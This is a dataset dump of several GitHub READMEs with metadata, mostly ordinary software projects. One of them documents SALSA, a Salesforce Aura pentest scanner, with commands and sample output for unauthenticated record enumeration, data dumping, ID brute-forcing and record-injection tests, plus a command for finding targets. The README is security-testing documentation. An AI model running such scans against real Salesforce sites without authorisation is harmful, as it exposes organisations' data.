- Decomposition pattern
- Security - Sensitive Data Encapsulation

# Software Architecture Design for Credit Finance Application

![image](https://github.com/user-attachments/assets/a56d549f-69b0-45ad-b9ed-974358181938)

## Installation
- make build: Builds the Docker image for the application.
- make up: Starts the application in detached mode.
- make down: Stops and removes the containers created by the application.
- make health: Builds the health-check Docker image.


## Contributing

- Fork the project.
- Create a new branch: git checkout -b new-feature
- Make your changes and commit them: git commit -am 'Add new feature'
- Push to the branch: git push origin new-feature
- Create a new Pull Request.


",0,1,1,0.0,"['credit', 'finance', 'application', 'general', 'feature', 'technology', 'use', 'design', 'pattern', 'use', 'software', 'architecture', 'design', 'credit', 'finance', 'application', 'installation', 'contribute']","['credit', 'finance', 'application', 'use', 'design']"
BulPlugins/BulMultiverse,main,"<p align=""center"">
    <img src=""https://i.goopics.net/77bvma.png"" width=""256"">
</p>

BulMultiverse is an ultra-optimized lightweight world management plugin. Compatible with version 1.8 to the Latest Minecrat version. Unlike the default Multiverse-Core plugin, BulMultiverse is designed to be lean and efficient, without any unnecessary listeners.. This plugin don't contain and will never contain any listeners for any reason.
[Download page](https://www.spigotmc.org/resources/118884/ ""Click to download"")

<img src=""https://img.shields.io/badge/Table_of_contents-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

1. [Features](#features)
1. [Configuration file](#configuration-file)
2. [Commands and permissions](#commands-and-permissions)
3. [Flags](#flags)
4. [How to delete a world](#how-to-delete-a-world)
5. [Addons](#addons)
6. [Distribution](#distribution)

<img id=""features"" src=""https://img.shields.io/badge/Features-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

- Create world with customizable settings (e.g seed, difficulty, etc).
- Modify Existing World Settings (e.g, difficulty, PvP, etc).
- Teleport between world.
- Load existing world.
- List loaded worlds.
- Disable invalid world names (e.g, ""plugins"").

<img id=""configuration-file"" src=""https://img.shields.io/badge/Configuration_file-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

```
//Disable invalid world names
world_disable_name: [plugins, bStats, PluginMetrics]

messages:
  no_world_target: ""&e[BULMultiverse] &cYou didn't target any world or world name. &e/bmv help""
  world_not_found: ""&e[BULMultiverse] &cThe world &e%name% is not found. &e/bmv list""
  flag_not_found: ""&e[BULMultiverse] &cThe flag %name% don't exist. &e/bmv flags""
  forbidden_world_name: ""&e[BULMultiverse] &cYou can't create a world with this name, check your config.yml.""
  cmd_load_success: ""&e[BULMultiverse] &aworld: &2%name% &aloaded.""
  cmd_teleport_success: ""&e[BULMultiverse] &aYou are teleported to the world: &2%name%.""
  cmd_unload_success: ""&e[BULMultiverse] &aThe world: &2%name% is unload.""
  error_set_option: ""&e[BULMultiverse] &cImpossible to set this option.""
  error_world_creator: ""&e[BULMultiverse] &cThis option does not support WorldCreator.""
  help_pattern: ""&e%usage% &8| &e%description%""
  flags_pattern: ""&e%usage% &8| &e%description%""
  only_ingame_command: ""&e[BULMultiverse] &cThis command can be executed only in-game.""
  no_permission: ""&e[BULMultiverse] &cYou don't have the permission to do that""
```

<img id=""commands-and-permissions"" src=""https://img.shields.io/badge/Commands_and_permissions-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

| Command                         | Description                                                       | Permission          |
|---------------------------------|-------------------------------------------------------------------|---------------------|
| bmv create [World Name] (Flags) | Create a world with the given name and optionals flags            | bulmultiverse.admin |
| bmv load [World Name]           | Load the target existing world                                    | bulmultiverse.admin |
| bmv unload [World Name]         | UnLoad the target existing world (This doesn't remove the folder) | bulmultiverse.admin |
| bmv set [World Name] [Flag]     | Set the flag for the target world                                 | bulmultiverse.admin |
| bmv tp [World Name]             | Teleport to the target world                                      | bulmultiverse.admin |
| bmv list                        | List all the worlds managed by BulMultiverse                      | bulmultiverse.admin |
| bmv infos (World Name)          | Display actual settings for the world                             | bulmultiverse.admin |
| bmv help                        | Display the in-game help                                          | bulmultiverse.admin |
| bmv flags                       | Display all the availables flag                                   | bulmultiverse.admin |

<img id=""flags"" src=""https://img.shields.io/badge/Flags-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

| Command            | Description                                           | example                             |
|--------------------|-------------------------------------------------------|-------------------------------------|
| -s [Number]        | Create a world with the given seed                    | /bmv create exemple -s 15648648949  |
| -b [true or false] | Enable the default builds in the world (e.g, village) | /bmv create exemple -b false        |
| -e [Environment]   | Set the environment (e.g, nether)                     | /bmv create exemple -e the_end      |
| -p [true or false] | Enable the pvp                                        | /bmv create exemple -p false        |
| -t [Type]          | Set type (e.g, flat, amplified)                       | /bmv create exemple -t large_biomes |
| -d [Difficulty]    | Set difficulty (e.g, easy, hard)                      | /bmv create exemple -d peaceful     |

You can chain flags together, for example:
`/bmv create exemple -d peaceful -p false -t flat`

Missed a flag during creation? You can set it later using the set command:
`/bmv set exemple -d peaceful`
> NOTE
> Some flags like the seed, cannot be changed after the world is created. If you make an error in the command, such as setting an invalid difficulty:
'/bmv create exemple -d SUPERHARDCORP'
the default difficulty will be used instead. Be sure to check the console for errors when creating worlds.

<img id=""how-to-delete-a-world"" src=""https://img.shields.io/badge/How_to_delete_a_world-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

BulMultiverse does not delete server files or folders directly. To remove a world:
1. Stop your server.
2. Manually delete the world's folder.
3. Restart your server.

BulMultiverse will detect that the world folder is missing and automatically remove it from its worlds.yml file.

<img id=""addons"" src=""https://img.shields.io/badge/Addons-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

> /!\ DO NOT RENAME THE ADDONS JAR FILE, OR THE PLUGIN WILL NOT DETECT THEM

So the default BulMultiverse.jar is very light and optimized, but what if you want an additional specific feature ?

To address this, I've created a robust addons system. This means you can add a specific .jar file (for example, PerWorldInventory.jar)
to the 'addons' folder within the BulMultiverse directory, and you'll have a new feature: PerWorldInventory!

#### VoidWorld

This addon allow you to create a totally empty world. [Download page](https://www.spigotmc.org/resources/119020/ ""Click to download"")

| Type    | value     | Description                     | example                     |
|---------|-----------|---------------------------------|-----------------------------|
| flag    | -c void   | Create a empty world (void)     | /bmv create exemple -c void |
| command | /setblock | Create a block at your position | /setblock                   |

#### PerWorldInventory

WORK IN PROGRESS. To be notified join the discord https://discord.gg/wxnTV68dX2

#### GuiWorldManager

WORK IN PROGRESS. To be notified join the discord https://discord.gg/wxnTV68dX2

#### LinkPortal

This addon allow you to link nether or end portal to specific world.. [Download page](https://www.spigotmc.org/resources/119396/ ""Click to download"")

<img id=""distribution"" src=""https://img.shields.io/badge/Distribution-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

This is a public plugin. You are free to use it and create a fork to develop your own version. However you are not allowed to sell or distribute it in a private manner.",0,3,1,2.0,"['voidworld', 'perworldinventory', 'guiworldmanager', 'linkportal']","['voidworld', 'perworldinventory', 'guiworldmanager', 'linkportal']"
davidtos/LIO,master,"# LIO (Linux IO)
This repository is part of my talk about Project Panama. I aim to show how you can call C libraries from inside your Java code.

## What is inside this repository
The library contains a working example of FUSE and IO_URING with liburing. 

- **FUSE** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/FuseMain.java)
  - To unmount use the following command `fusermount3 -u $FILE_PATH`
- **IO_URING READ** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/IoUringReadExample.java)
  - The read example uses polling to reduce the number of system calls.
  - To see that the polling is working you can use `sudo bpftrace -e 'tracepoint:io_uring:io_uring_submit_req* {printf(""%s(%d)\n"", comm, pid);}'` this shows you what called submit.
- **IO_URING WRITE** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/IoUringWriteExample.java)
  - The write example does not use polling but makes a system call.

## Wrapper code
The code that calls the C code is generated using [Jextract](https://github.com/openjdk/jextract). Jextract creates Java code based on the header files.

To generate FUSE:
`jextract -D_FILE_OFFSET_BITS=64 -D FUSE_USE_VERSION=35 --source -d generated/src -t org.libfuse -I /Documents/libfuse-fuse-3.10.5/include/ /Documents/libfuse-fuse-3.10.5/include/fuse.h`

To generate Liburing:
`jextract -D IOURINGINLINE=extern  -l uring -t io.uring -I include --output ./generated --header-class-name liburingtest include/liburing.h`

## Side note
This sample code is not production ready, it's just a proof of concept that happens to work.
",0,0,3,0.0,"['lio', 'linux', 'io', 'what', 'inside', 'repository', 'wrapper', 'code', 'side', 'note']","['lio', 'linux', 'io', 'what', 'inside']"
kousiknath/Concurrency,main,"## Concurrency and Multi-threading for everyone 

1. Recipe for alternate data printing (synchronization, wait-notify, volatile)
2. Recipe for rate limiting (Semaphore)
3. Recipe for counting words in a big file (Countdown Latch)
4. Recipe for Friends Outing (Cyclic Barrier)
5. Recipe for bank transaction (ReentrantLock)
6. Recipe for in-memory logging (ReadWriteLock)
7. Recipe for producer-consumer model (Lock.Condition, wait-notify)
",0,0,1,0.0,"['concurrency', 'everyone']","['concurrency', 'everyone']"
cosad3s/salsa,main,"# SALSA - *SALesforce Scanner for Aura (and beyond)*

<p align=""center"">
<img src=""./assets/logo.jpeg"" width=""150"">

**SALSA** has been developped on a lot of my personal free time, to help me on pentesting and bug hunting activites against Salesforce Lightning (Aura) and API assets. Please note it is fully experimental.

I decided to share it for free, to help the community.  
*If you would ever like to buy me a coffee or a beer* 😇 :

[![""Buy Me A Coffee""](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/cosades)  

</p>

## Features

- Enumeration and/or dump data records (*and sub-records*) from:
  - Aura controllers
  - Services API (Direct sObjects `/services/data/v60.0/sobjects` or SOQL `/services/data/v60.0/query/`)
  - SOAP (`/services/Soap/c/`)
- Works as unauthenticated or authenticated user (*username / password or `sid` or `aura.token`*).
- Enumeration records entities types (with or without custom entities `*__c` filtering) from:  
  - Target APIs harvesting
  - And/or Salesforce packages reflections
  - And/or encountered entities in the wild
- Test for targetted record identifier.
- Bruteforcing record identifiers.
- ⚠️ Automatized test for arbitrary records creation.
- ⚠️ Automatized test for arbitrary records fields edition.
- *And more: routing to HTTP proxy for investigation, custom User-Agent, automatized finding of entities fields, auto-detect FWUID, etc.*

⚠️: *dangerous & experimental*

## Usage

### Help

```bash
usage: SALSA 💃⚡ - SALesforce Scanner for Aura (and beyond)
       [-h] -t TARGET [-u USERNAME] [-p PASSWORD] [--sid SID] [--token TOKEN] [--path PATH] [--id ID] [--bruteforce] [--types TYPES] [--update] [--create] [--ua UA] [--proxy PROXY] [--dump]
       [--output OUTPUT] [--typesintrospection] [--typeswordlist] [--typesapi] [--custom] [--app APP] [--force] [--debug] [--trace]

Enumeration of vulnerabilities and misconfiguration against Salesforce endpoint.

named arguments:
  -h, --help             show this help message and exit
  -t TARGET, --target TARGET
                         Target URL
  -u USERNAME, --username USERNAME
                         Username (for authenticated mode)
  -p PASSWORD, --password PASSWORD
                         Password (for authenticated mode)
  --sid SID              The SID cookie value (for authenticated mode - instead of username/password)
  --token TOKEN          The aura token (for authenticated mode - instead of username/password)
  --path PATH            Set specific base path.
  --id ID                Find a specific record from its id.
  --bruteforce           Enable bruteforce of Salesforce identifiers from a specific record id (from --recordid). (default: false)
  --types TYPES          Target record(s) only from following type(s) (should be comma-separated).
  --update               Test for record fields update permissions (WARNING: will inject data in the app!). (default: false)
  --create               Test for record creation permissions (WARNING: will inject data in the app!). (default: false)
  --ua UA                Set specific User-Agent.
  --proxy PROXY          Use following HTTP proxy (ex: 127.0.0.1:8080).
  --dump                 Dump records as Json files. (default: false)
  --output OUTPUT        Output folder for dumping records as Json files.
  --typesintrospection   Use record types from Salesforce package introspection. (default: false)
  --typeswordlist        Use record types from internal wordlist. (default: false)
  --typesapi             Use record types from APIs on the target. (default: false)
  --custom               Only target custom record types (*__c). (default: false)
  --app APP              Custom AURA App Name.
  --force                Continue the scanning actions even if in case of incoherent or incorrect results. (default: false)
  --debug                Increase the log level to DEBUG mode. (default: false)
  --trace                Increase the log level to TRACE mode. (default: false)
```

### Examples

<details>
    <summary>Simple scan - Unauthenticated</summary>

```bash
java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --typesapi

[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Scan will continue as unauthenticated (guest) user ...
[*] Looking for all objects with standard or custom types.
[*] Will retrieve all sObjects types known by the target from Aura service.
[*] Found 2111 object types from Salesforce Aura service!
[*] Will retrieve all sObjects types known by the target from REST sObject API.
[*] Aura: looking for records for type AINaturalLangProcessRslt
[*] Aura: looking for records for type AINtrlLangProcChunkRslt
[*] Aura: looking for records for type AIPredictionScore
(...)
```

</details>

<details>
    <summary>Simple scan - Unauthenticated - Custom types only</summary>

```bash
❯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --typesapi --custom

[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Scan will continue as unauthenticated (guest) user ...
[*] Looking for all objects with standard or custom types.
[*] Will retrieve all sObjects types known by the target from Aura service.
[*] Found 2111 object types from Salesforce Aura service!
[*] Will retrieve all sObjects types known by the target from REST sObject API.
[*] Reducing to 4 custom object types.
[*] Aura: looking for records for type CountryLanguage__c
[*] Looking for sObject with recordId 00B0H000007t1qlUAA and type(s) [ListView].
[!] The recordId 00B0H000007t1qlUAA cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: We couldn't find the record you're trying to access. It may have been deleted by another user, or there may have been a system error. Ask your administrator for help.).
[!] No records found from recordId 00B0H000007t1qlUAA and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={ListView={_nameField=Name, _entityLabel=List View, _keyPrefix=00B}}, quickActionRecordTemplates={}, recordErrors={00B0H000007t1qlUAA={message=We couldn't find the record you're trying to access. It may have been deleted by another user, or there may have been a system error. Ask your administrator for help.}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={00B0H000007t1qlUAA=[00B0H000007t1qlUAA.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Aura: looking for records for type Country__c
[*] Looking for sObject with recordId 00B0H000007t1qgUAA and type(s) [ListView].
(...)
```

</details>

<details>
    <summary>Simple scan - Unauthenticated - Targetted record type and bruteforce</summary>

```bash
❯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --types Store__History --id 0176S0001GvGwvEQQS --bruteforce
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Scan will continue as unauthenticated (guest) user ...
[*] Looking for sObject with recordId 0176S0001GvGwvMQQS and type(s) [Store__History].
[!] Cannot find fields for object type Store__History through descriptor aura://RecordUiController/ACTION$getObjectInfo.
[!] Cannot find record with fields for ID 0176S0001GvGwvMQQS and type Store__History.
[!] The recordId 0176S0001GvGwvMQQS cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId 0176S0001GvGwvMQQS and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={0176S0001GvGwvMQQS={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={0176S0001GvGwvMQQS=[0176S0001GvGwvMQQS.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Looking for sObject with recordId 0176S0001GvGwvNQQS and type(s) [Store__History].
[!] Cannot find record with fields for ID 0176S0001GvGwvNQQS and type Store__History.
[!] The recordId 0176S0001GvGwvNQQS cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId 0176S0001GvGwvNQQS and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={0176S0001GvGwvNQQS={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={0176S0001GvGwvNQQS=[0176S0001GvGwvNQQS.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Looking for sObject with recordId 0176S0001GvGwvLQQS and type(s) [Store__History].
[!] Cannot find record with fields for ID 0176S0001GvGwvLQQS and type Store__History.
[!] The recordId 0176S0001GvGwvLQQS cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId 0176S0001GvGwvLQQS and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={0176S0001GvGwvLQQS={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={0176S0001GvGwvLQQS=[0176S0001GvGwvLQQS.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Looking for sObject with recordId 0176S0001GvGwvKQQS and type(s) [Store__History].
(...)
```

</details>

<details>
    <summary>Simple scan - Authenticated - Targetted record type</summary>

```bash
❯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --types User --sid '00Di000.REDACTED' --token ""eyJ2ZXIiOi.REDACTED""
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Will try with explicitly provided credentials {username=''}
[*] Looking for all objects with type(s) [User].
[*] Aura: looking for records for type User
[!] Client is out-of-sync. Will retry with new FWUID: WFIwUmVJdm.REDACTED
[*] Looking for sObject with recordId 005ixxxxx and type(s) [User].
[*] Found 190 fields for sObject type User from Aura service.
[*] Found record 005ixxxxxx with descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord!
[*] 1 object(s) retrieved with descriptor serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems from object type User!
[*] End of scanning of https://www.target.com
```

</details>

<details>
    <summary>Simple scan - Authenticated - Custom record types dump</summary>

```bash
❯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --typesapi --custom --sid '00Di000.REDACTED' --token ""eyJ2ZXIiOi.REDACTED"" --dump --proxy 127.0.0.1:8080
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Will try with explicitly provided credentials {username=''}
[*] Looking for all objects with standard or custom types.
[*] Will retrieve all sObjects types known by the target from Aura service.
[!] Client is out-of-sync. Will retry with new FWUID: WFIwUmVJ...REDACTED
[*] Found 2111 object types from Salesforce Aura service!
[*] Will retrieve all sObjects types known by the target from REST sObject API.
[*] Found 279 object types from Salesforce REST sObject API!
[*] Reducing to 24 custom object types.
[*] Aura: looking for records for type MyOtherType__c
[*] SOAP: looking for records for type MyOtherType__c
[*] Found 0 entities of types MyOtherType__c through SOAP API!
[*] Query Data API: looking for records for type MyOtherType__c
[*] SObject Data API: looking for records for type MyOtherType__c
[*] Aura: looking for records for type Wonderful__c
[*] SOAP: looking for records for type Wonderful__c
[*] Found 0 entities of types Wonderful__c through SOAP API!
[*] Query Data API: looking for records for type Wonderful__c
[*] SObject Data API: looking for records for type Wonderful__c
[*] Aura: looking for records for type MyOtherTypeAgain__c
[*] SOAP: looking for records for type MyOtherTypeAgain__c
[*] Found 0 entities of types MyOtherTypeAgain__c through SOAP API!
[*] Query Data API: looking for records for type MyOtherTypeAgain__c
[*] SObject Data API: looking for records for type MyOtherTypeAgain__c
[*] Aura: looking for records for type MyType__c
[*] SOAP: looking for records for type MyType__c
[*] Found 10 entities of types MyType__c through SOAP API!
[*] Looking for sObject with recordId a4AREDACTED and type(s) [MyType__c].
[!] Cannot find fields for object type MyType__c through descriptor aura://RecordUiController/ACTION$getObjectInfo.
[*] Found 29 fields for sObject type MyType__c from REST sObject API.
[!] Cannot find record with fields for ID a4AREDACTED and type MyType__c.
[!] The recordId a4AREDACTED cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId a4AREDACTED and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={a4AREDACTED={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={a4AREDACTED=[a4AREDACTED.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Found sObject a4AREDACTED of type MyType__c from REST sObject API: [MyType__c]{[[StartDateTime__c=2023-12-05T18:00:00.000+0000], [CreatedDate=2023-11-28T14:07:00.000+0000],....]}
[*] Looking for sObject with recordId a4A6REDACTED and type(s) [MyType__c].
[!] Cannot find record with fields for ID a4A6REDACTED and type MyType__c.
(...)
[*] Query Data API: looking for records for type TR_MyLV_Diamond__c
[*] SObject Data API: looking for records for type TR_MyLV_Diamond__c
[*] Will dump merged object a4AREDACTED to ./output2024.07.22.21.57.00/MyType__c/a4AREDACTED.json
[*] Will dump merged object a2RREDACTED to ./output2024.07.22.21.57.00/MyOtherType__c/a2RREDACTED.json
[*] Will dump merged object a0NREDACTED to ./output2024.07.22.21.57.00/MyOtherTypeAgain__c/a0NREDACTED.json
(...)
```

**Dumped records will be stored into a timestamped output folder**

</details>

## Current limitations

- SOAP `query` requests are limited to 10 items.
- Bruteforcing IDs is limited to 10 items.

## TODO

*Release date: maybe one day*

- [ ] Find & add alternatives authentications.
- [ ] Detect `debug` mode arbitrary activation ([https://www.cosades.com/posts/sf_debug_mode](https://www.cosades.com/posts/sf_debug_mode)).  
- [ ] Download item for *Document* type identifier (hit `https://ATTACHMENTS_DOMAIN/sfc/servlet.shepherd/version/download/<id>` - *URL can also be found in `Generic_DocumentDownloadPathUrl` attribute from descriptor `serviceComponent://ui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableComponentLoaderController/ACTION$getPageComponent`*)  
- [ ] Data API - Composite: `/services/data/vXX.0/composite/batch` (POST, with examples parameters: `{""batchRequests"": [{""method"": ""PATCH"", ""url"": ""v38.0/sobjects/OpportunityLineItem/<ID>"", ""richInput"": {""End_Date__c"": ""2017-01-19""}]}}`)  
- [ ] Data API - Anonymous APEX execution: `/services/data/vXX.0/tooling/executeAnonymous/?anonymousBody=`
- [ ] Async API - Job: `/services/async/xx.0/job` (POST and `<?xml version=""1.0"" encoding=""UTF-8""?><jobInfo xmlns=""http://www.force.com/2009/06/asyncapi/dataload""><operation>update</operation><object>OpportunityLineItem</object><contentType>CSV</contentType></jobInfo>` or `<?xml version=""1.0"" encoding=""UTF-8""?><jobInfo xmlns=""http://www.force.com/2009/06/asyncapi/dataload""><state>Closed</state></jobInfo>`). Other related endpoints: `/services/data/v60.0/jobs/query`, `/services/async/xx.0/job/JOBID`,  `/services/async/xx.0/job/JOBID/batch`, `/services/async/xx.0/job/JOBID/batch/BATCHID/result`
- [ ] Apex REST API: `/services/apexrest/SoapMessage`, `/services/apexrest/Cases`
- [ ] Find the parameters for other classic Aura controllers 🥹

## Troubleshooting

> **Disclaimer: ""spaghetti code"" here, due to Salesforce technical contexts discoveries, mixed between official documentations, write-ups, reverse engineering, empirical tests. Hence I could study for small new features proposals or major bug fixes, this tool is now hard to maintain.**

***Then, before opening an issue, please consider the following points:***

1. I strongly encourage you to **switch the logging level** to `DEBUG` or `TRACE` level (`--debug` / `--trace`).
2. The tool can send **thousand of requests** and **works for hours**. Two possible consequences:

- **You can be banned** by the target.
- **The authentication could have a short expiration time on your target**. *I do not know how to detect & manage that part, there is no real homogeneous behaviour for this.* I could only suggest you to reduce the record types to test.

3. I think the tool is adapted to most of Salesforce contexts, **but not all of them**.
4. Route the tool **an HTTP proxy** for further investigation (`--proxy 127.0.0.1:8080` for instance)

## Q/A

*Why is the authentication username/password does not work ?*

> Because the target is maybe not using the Aura Controller `apex://LightningLoginFormController/ACTION$login`: prefer using the `sid` (session id) or `token` (Aura token) after a manual authentication.  

*What's is the difference between `sid` and `token` ?*

> The `token` is used for authenticated Aura controller interactions. The `sid` is used to interact with other APIs (and sometimes Aura controllers). The format are not the same though: for the `token` it is more like a JWT, for the `sid` it is prefixed by the organization identifier.

*Why there are limitations regarding the amount of data dump in queries for example ?*

> Yes, it could be improved with new arguments. The initial reason was that the tool can launch thousand of requests and could last for hours (Entities count / fields cound / controllers count / services count / etc.). The limitations are present to reduce the duration. Feel free to change that.

*How do I find targets ?*

> It is up to you, but it can be done with nuclei: `nuclei -rl 10 -t ""http/misconfiguration/salesforce-aura.yaml"" -l subdomains.txt`

*Why the source code is so complex ? Why Java ?*

> In the beginning it was a clean set of small scripts. Discoveries after discoveries, I have added, modified, removed some parts. Without unit tests. And Salesforce contexts are very complex / customisable, targets behaviors can differ and code is adapted with some unelegant if/then/else. The last reason is that I wanted to have the most adaptable and automatized tool for this kind of assessment. I dig into complex workflows, but abandonned some steps. Why Java ? Because Salesforce APEX is very close to Java, and Salesforce have some libraries in Java which could be decompiled to be dynamically integrated into the tool. And I like Java (nobody is perfect).

## Credits and ressources

Thanks for all these ressources (tools, write-ups, docs, ...), which help me a lot:

- https://www.fishofprey.com/
- https://developer.salesforce.com/
- https://developer.salesforce.com/blogs/tech-pubs/2017/01/simplify-your-api-code-with-new-composite-resources
- https://developer.salesforce.com/docs/atlas.en-us.api_tooling.meta/api_tooling/intro_rest_resources.htm
- https://developer.salesforce.com/docs/atlas.en-us.api_tooling.meta/api_tooling/tooling_api_objects_traceflag.htm
- https://www.varonis.com/blog/abusing-salesforce-communities
- https://github.com/tedconn/lwr-mobify
- https://github.com/Ophion-Security/sret
- https://github.com/forcedotcom/aura
- https://github.com/jeffzmartin/SalesforceSQLSchemaGenerator
- https://github.com/LTiDi2000/SFMisCheck/blob/main/sf.py
- https://github.com/pingidentity/AuraIntruder/
- https://www.youtube.com/watch?v=wHqp6laTnio
- https://web.archive.org/web/20201031233746/https://www.enumerated.de/index/salesforce
- https://codefriar.wordpress.com/2014/10/30/eval-in-apex-secure-dynamic-code-evaluation-on-the-salesforce1-platform/
- https://blog.intigriti.com/hacking-tools/hacking-salesforce-lightning-guide-for-bug-hunters

## Licence

Released under [GPL-3.0 license](/LICENSE).  
",3,0,2,0.0,"['salsa', 'salesforce', 'scanner', 'aura', 'and', 'beyond', 'feature', 'usage', 'help', 'example', 'current', 'limitation', 'todo', 'troubleshoot', 'credit', 'ressources', 'licence']","['salsa', 'salesforce', 'scanner', 'aura', 'and']"
sivaprasadreddy/spring-modular-monolith,main,"# spring-modular-monolith
An e-commerce application following Modular Monolith architecture using [Spring Modulith](https://spring.io/projects/spring-modulith).
The goal of this application is to demonstrate various features of Spring Modulith with a practical application.

![bookstore-modulith.png](bookstore-modulith.png)

This application follows modular monolith architecture with the following modules:

* **Common:** This module contains the code that is shared by all modules.
* **Catalog:** This module manages the catalog of products and store data in `catalog` schema.
* **Customers:** This module implements the customer management and store data in `customers` schema.
* **Orders:** This module implements the order management and store the data in `orders` schema.
* **Inventory:** This module implements the inventory management and store the data in `inventory` schema.
* **Notifications:** This module handles the events published by other modules and sends notifications to the interested parties.

**Goals:**
* Implement each module as independently as possible.
* Prefer event driven communication over direct module dependency wherever applicable.
* Store data managed by each module in an isolated manner by using different schema or database.
* Each module should be testable by loading only module-specific components.

**Module communication:**

* **Common** module is an OPEN module that can be used by other modules.
* **Orders** module invokes the **Catalog** module public API to validate the order details
* When an Order is successfully created, **Orders** module publishes **""OrderCreatedEvent""**
* The **""OrderCreatedEvent""** will also be published to external broker like RabbitMQ. Other applications may consume and process those events.
* **Inventory** module consumes ""OrderCreatedEvent"" and updates the stock level for the products.
* **Notifications** module consumes ""OrderCreatedEvent"" and sends order confirmation email to the customer.

## Prerequisites
* JDK 21
* Docker and Docker Compose
* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))

Install JDK, Gradle using [SDKMAN](https://sdkman.io/)

```shell
$ curl -s ""https://get.sdkman.io"" | bash
$ source ""$HOME/.sdkman/bin/sdkman-init.sh""
$ sdk install java 21.0.1-tem
$ sdk install gradle
$ sdk install maven
```

Task is a task runner that we can use to run any arbitrary commands in easier way.

```shell
$ brew install go-task
(or)
$ go install github.com/go-task/task/v3/cmd/task@latest
```

Verify the prerequisites

```shell
$ java -version
$ docker info
$ docker compose version
$ task --version
```

## Using `task` to perform various tasks:

The default `Taskfile.yml` is configured to use Gradle.
Another `Taskfile.maven.yml` is also created with Maven configuration.

If you want to use Maven instead of Gradle, then add `-t Taskfile.maven.yml` for the `task` commands.

For example: 

```shell
$ task test` // uses Gradle
$ task -t Taskfile.maven.yml test` //uses Maven
```

```shell
# Run tests
$ task test

# Automatically format code using spotless-maven-plugin
$ task format

# Build docker image
$ task build_image

# Run application in docker container
$ task start
$ task stop
$ task restart
```

* Application URL: http://localhost:8080 
